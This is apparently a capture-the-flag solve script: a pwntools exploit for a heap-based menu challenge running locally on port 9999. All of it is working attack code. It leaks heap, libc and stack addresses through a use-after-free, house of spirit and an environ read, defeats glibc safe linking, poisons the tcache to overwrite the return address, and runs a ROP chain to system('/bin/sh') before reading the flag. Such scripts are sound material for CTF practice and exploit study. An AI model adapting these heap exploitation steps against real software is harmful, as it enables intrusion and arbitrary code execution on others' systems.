#!/usr/bin/python3
from pwn import *

elf = ELF("../public/chall")
libc = ELF("../public/libc.so.6")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9999

gs = """
continue
"""


def start():
    if args.DEBUG:
        context.log_level = "debug"
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def add(idx, name_size, name, price=None):
    if not price:
        price = idx

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(name_size).encode())
    io.sendafter(b": ", str(price).encode())
    io.sendafter(b": ", name)

    return idx


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"price: ")
    price = io.recvline().strip()
    io.recvuntil(b"name: ")
    name = io.recvline().strip()

    return name, price


def encrypt_safe_linking(addr, heap):
    return addr ^ (heap >> 12)


# from https://github.com/shellphish/how2heap/blob/master/glibc_2.36/decrypt_safe_linking.c
def decrypt_safe_linking(cipher):
    key, plain = 0, 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


def main():
    global io
    io = start()
    io.sendline(b"")  # skip intro

    # =-=-= STAGE 1: LEAK HEAP =-=-=
    # via UAF, but remember there are safe linking protection
    add(0, 0x28, b"leak_heap")
    add(1, 0x28, b"leak_heap")
    delete(0)
    delete(1)
    add(1, 0x28, b"\x01")
    leaks = view(1)
    heap = decrypt_safe_linking(u64(leaks[0].ljust(8, b"\x00"))) >> 12 << 12
    log.info(f"heap: {hex(heap)}")
    add(0, 0x28, b"reset_heap")

    # =-=-= STAGE 2: LEAK LIBC =-=-=
    # via unsorted chunk by making overlapping chunks via house of spirit

    # house of spirit
    add(2, 0x78, p64(0x91) * 15)
    add(3, 0x78, p64(0x91) * 15)
    free_addr = heap + 0x3c0
    for _ in range(7):  # fill 0x90 tcachebins
        delete(3)
        delete(2)
        add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
        delete(3)

        # realloc and overwriting arbitrary freed chunk's tcache key
        add(3, 0x78, p64(0x91) * 15)
        add(2, 0x78, p64(0x91) * 15)

    # get unsorted chunk
    delete(3)
    delete(2)
    free_addr = heap + 0x430
    add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
    delete(3)  # got unsorted chunk at heap + 0x430
    add(5, 0x78, b"A" * 48)
    leaks = view(5)
    libc.address = u64(leaks[0][48:].ljust(8, b"\x00")) - 0x219ce0
    log.info(f"libc: {hex(libc.address)}")

    # =-=-= STAGE 3: LEAK STACK =-=-=
    # by overwriting allocated item's name ptr to environ
    # via overlapping chunks same as stage 2

    # heap grooming
    delete(5)
    add(5, 0x78, b"A" * 40 + p64(0x91))
    add(5, 0x68, b"clear_unsorted")
    add(5, 0x78, b"asdf")

    # house of spirit
    add(2, 0x78, p64(0x71) * 15)
    add(3, 0x78, p64(0x71) * 15)
    delete(3)
    delete(2)
    free_addr = heap + 0x600
    add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
    delete(3)

    # leak it!!
    add(5, 0x68, p64(0) * 3 + p64(0x21) + p64(0) + p64(libc.sym.environ))
    leaks = view(5)
    rip = u64(leaks[0].ljust(8, b"\x00")) - 0x120
    log.info(f"rip: {hex(rip)}")

    # =-=-= STAGE 4: ROP =-=-=
    # by making overlapping chunks same as stage 2
    # and do tcache poisoning on those chunks
    # to overwrite rip with our rop chain

    # house of spirit
    add(2, 0x78, p64(0x81) * 15)
    add(3, 0x78, p64(0x81) * 15)
    delete(2)
    delete(3)
    free_addr = heap + 0x600
    add(4, 0x18, p64(0) + p64(free_addr))  # arbitrary free
    delete(2)

    # tcache poisoning
    add(5, 0x78, b"A"*56 + p64(0x81) +
        p64(encrypt_safe_linking(rip-0x8, heap+0x640)))  # rip-0x8 because of alignment
    add(5, 0x78, b"asdf")

    # rop!!!
    pop_rdi = libc.address + 0x2a3e5
    ret = pop_rdi+1
    bin_sh = next(libc.search(b"/bin/sh"))
    rop_chain = flat(
        b"A" * 8,  # padding because rip-0x8
        ret,  # once again, alignment
        pop_rdi, bin_sh,
        libc.sym.system
    )
    add(5, 0x78, rop_chain)

    # =-=-= STAGE 5: PROFIT =-=-=
    io.sendlineafter(b"> ", b"5")
    io.sendline(b"cat flag*")
    io.interactive()


if __name__ == "__main__":
    main()
